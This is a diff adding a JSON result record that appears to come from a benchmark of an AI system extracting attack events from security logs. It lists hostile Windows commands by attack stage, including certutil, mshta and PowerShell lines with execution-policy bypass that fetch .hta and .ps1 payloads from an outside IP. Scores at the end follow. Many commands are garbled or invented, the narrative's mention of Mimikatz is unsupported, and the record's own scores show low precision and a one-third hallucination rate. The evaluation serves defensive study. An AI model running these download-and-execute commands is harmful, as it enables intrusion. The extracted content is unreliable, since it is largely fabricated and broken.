@@ -1,0 +1,136 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\\\\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -encode b.txt a.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wermgr.exe -upload",
+        "stage": "Collection"
+      },
+      {
+        "command": "wermgr.exe -purgestores",
+        "stage": "Collection"
+      },
+      {
+        "command": "get-winevent -MaxEvents 1000 | Select-Object -ExpandProperty Message",
+        "stage": "Discovery"
+      },
+      {
+        "command": "get-service | ft -AutoSize",
+        "stage": "Discovery"
+      },
+      {
+        "command": "invoke-webrequest http://124.223.85.207:8082/test.hta -method POST -usebasicparsing -contenttype application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c invoke-webrequest http://124.223.85.207:8082/test.hta -method POST -usebasicparsing -contenttype application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c copy-item -path ./msxsl.exe -dest 'c:\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\", ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c import-module psimage -out .\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c new-item -force -path '\\\\.\\pipe\\windowsupdate', ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c $stdin=[console]::InputReadMode;$stdout=[console]::OutputEncoding=[text.encoding]::unicode,$stdin=$false,$stdout=$true,new-console -visible $null,invoke-expression ([ref]$([scriptblock]>::invokewithhiddenerror{$stdin=$true}).ref), ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c $args=new-object system.net.webclient;set-alias curl $args;curl http://124.223.85.207:8082/Powershell.ps1 -outfile '%TEMP%\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c invoke-static-method -staticmethod=system.security.securestringconstructor,$args=ConvertTo-SecureString '' -asplaintext -force,$stdin=$(convertfrom-json '{",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell -executionpolicy bypass -c powershell -executionpolicy bypass -c @<script>...</script>",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -sta",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -sta",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -windowstyle hidden",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -windowstyle hidden -executionpolicy bypass ",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attacker has carried out an attack against the victim machine using various techniques such as executing PowerShell scripts from within Visual Studio Code, downloading and running malware binaries from the web, and utilizing tools like Mimikatz to gain escalated privileges.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 235611,
+      "completion_tokens": 2982,
+      "total_tokens": 238593,
+      "wall_clock_s": 72.667,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.08695652173913043,
+      "recall": 0.05405405405405406,
+      "f1": 0.06666666666666667,
+      "tp": 2,
+      "fp": 21,
+      "fn": 35
+    },
+    "stage": {
+      "precision": 0.043478260869565216,
+      "recall": 0.02702702702702703,
+      "f1": 0.03333333333333333,
+      "tp": 1,
+      "fp": 22,
+      "fn": 36,
+      "recall_partial": 0.04054054054054054
+    },
+    "hallucination_rate": 0.3333333333333333,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 235611,
+      "completion_tokens": 2982,
+      "total_tokens": 238593,
+      "wall_clock_s": 72.667,
+      "parse_retries": 1
+    }
+  }
+}
